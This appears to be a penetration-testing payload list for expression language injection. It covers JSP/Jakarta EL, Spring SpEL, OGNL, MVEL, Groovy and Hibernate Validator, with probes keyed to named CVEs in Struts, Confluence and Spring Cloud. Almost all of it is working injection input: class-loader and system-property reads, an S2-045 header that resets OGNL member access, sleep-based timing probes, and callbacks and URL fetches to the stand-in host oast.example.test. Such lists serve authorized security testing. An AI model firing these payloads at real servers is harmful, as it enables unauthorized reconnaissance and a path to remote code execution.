# Expression Language Injection Payloads
# Evaluator-level probes. Start with arithmetic; use property reads or DNS callbacks for confirmation.

# Generic arithmetic detection across delimiters
#{6*7}
%{7*7}
${7*'7'}
#{7*'7'}
${"el-"+"marker"}
#{"el-"+"marker"}
${'a'.concat('b')}
${1+1}
%{1+1}

# JSP / Jakarta Unified EL
${applicationScope}
${param}
${header}
${cookie}
${pageContext.request.serverName}
${pageContext.request.contextPath}
${pageContext.servletContext.serverInfo}
${pageContext.request.getHeader('User-Agent')}
${pageContext.request.scheme}
${pageContext.class.classLoader}
${initParam}

# EL 3 / Jakarta EL class access (runs a harmless property read)
${"".getClass().forName("java.lang.System").getMethod("getProperty","".getClass()).invoke(null,"os.name")}
${"".getClass().forName("java.lang.System").getMethod("getProperty","".getClass()).invoke(null,"java.version")}
#{"".getClass().forName("java.lang.System").getMethod("getProperty","".getClass()).invoke(null,"os.name")}
${request.getClass().getName()}

# Spring Expression Language (SpEL)
#{7*7*1}
T(java.lang.System).getProperty('os.name')
T(java.lang.System).getProperty('java.version')
T(java.lang.System).getenv('PATH')
T(java.net.InetAddress).getByName('oast.example.test')
new java.util.Date()
'spel-marker'.toUpperCase()
#this
#root
@environment.getProperty('java.version')
T(java.lang.Runtime).getRuntime().availableProcessors()
new java.net.URL('http://oast.example.test/spel').openStream()
T(java.lang.Class).forName('java.lang.System')
T(org.springframework.util.StreamUtils).copy(new java.net.URL('http://oast.example.test/spel').openStream(),new java.io.ByteArrayOutputStream())

# SpEL injection via headers (Spring Cloud Function, CVE-2022-22963)
spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("oast.example.test")
spring.cloud.function.routing-expression: T(java.lang.System).getProperty("os.name")

# SpEL via Spring Cloud Gateway actuator route (CVE-2022-22947): route filter args carry an expression
{"id":"el-marker","filters":[{"name":"AddResponseHeader","args":{"name":"X-El","value":"#{T(java.lang.System).getProperty('os.name')}"}}],"uri":"http://example.test","predicates":[]}

# Spring Data Commons projection binding (CVE-2018-1273) parameter name probe
username[#this.getClass().forName("java.lang.System").getProperty("os.name")]=x

# OGNL (Struts 2, Confluence, others)
%{#a=@java.lang.System@getProperty('os.name')}
%{@java.lang.System@getProperty('os.name')}
%{@java.lang.System@getProperty('java.version')}
%{#context}
%{#request}
%{#session}
%{#application}
%{#attr}
%{#_memberAccess}
%{#parameters}
%{(#a=@java.net.InetAddress@getByName('oast.example.test')).toString()}
%{'ognl-marker'.toUpperCase()}

# OGNL via Struts Content-Type header (S2-045, CVE-2017-5638): harmless arithmetic probe placed in a malformed multipart header
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#o=@java.lang.System@getProperty('os.name')).(#r=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#r.addHeader('X-Ognl',#o))}.multipart/form-data

# OGNL via URL (Confluence CVE-2022-26134 pattern): expression inside the path, evaluated before authentication
/%24%7B%40java.lang.System%40getProperty%28%22os.name%22%29%7D/

# OGNL via URL-encoded redirect/action parameters (Struts forced evaluation)
?redirect:${7*7}
?redirectAction:${7*7}
?action:${7*7}
?method:${7*7}
?id=%25%7b7*7%7d
?name=%{7*7}
?name=%25{7*7}

# MVEL
System.getProperty('os.name')
java.lang.System.getProperty('java.version')
new java.net.URL('http://oast.example.test/mvel').openStream()

# Groovy expression evaluation
"${7*7}"
'groovy-marker'.toUpperCase()
"oast.example.test".toURL().text

# Hibernate Validator / Bean Validation message interpolation (use in a field that appears in a validation error message)
${'a'+'b'}
#{49*1}
${java.lang.System.getProperty('os.name')}
$\A{7*7}

# Expression delimiter filter bypass
${ 7*7 }
${(7*7)}
${7*(3+4)}
%{ 7*7 }
#{ 7*7 }

# Time-based detection when output is not reflected (only on fixtures you own)
${T(java.lang.Thread).sleep(3000)}
%{@java.lang.Thread@sleep(3000)}
#{T(java.lang.Thread).sleep(3000)}

# Error-message leakage probes
${undefined_variable_marker}
#{undefined_variable_marker}
%{#undefined_variable_marker}
${1/0}
